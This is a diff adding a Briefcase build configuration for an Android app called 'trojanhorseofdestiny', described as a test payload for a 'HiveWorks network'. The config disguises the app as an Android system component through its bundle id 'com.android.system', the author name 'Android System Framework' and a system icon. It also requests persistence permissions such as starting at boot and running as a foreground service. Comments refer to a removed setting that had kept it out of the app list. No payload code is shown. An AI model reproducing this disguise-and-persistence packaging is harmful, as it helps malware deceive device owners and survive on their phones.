@@ -1,0 +1,39 @@
+[tool.briefcase]
+project_name = "System Internet"
+bundle = "com.android.system"
+version = "1.0.0"
+url = "https://example.com"
+license = "MIT"
+author = "Android System Framework"
+author_email = "admin@example.com"
+
+[tool.briefcase.app.trojanhorseofdestiny]
+formal_name = "trojanhorseofdestiny"
+description = "Test payload for the HiveWorks network."
+sources = ["src/trojanhorseofdestiny"]
+requires = [
+    "requests",
+    "curl_cffi"
+]
+
+[tool.briefcase.app.trojanhorseofdestiny.android]
+# Make it visible for testing
+icon = "system_icon"
+
+build_gradle_dependencies = []
+permissions = [
+    "android.permission.INTERNET",
+    "android.permission.ACCESS_NETWORK_STATE",
+    "android.permission.WAKE_LOCK",
+    "android.permission.RECEIVE_BOOT_COMPLETED",
+    "android.permission.FOREGROUND_SERVICE"
+]
+
+# Removed the launcherCategory override to make it show up in the app list
+build_gradle_extra = """
+android {
+    defaultConfig {
+        // Normal visibility for testing
+    }
+}
+"""
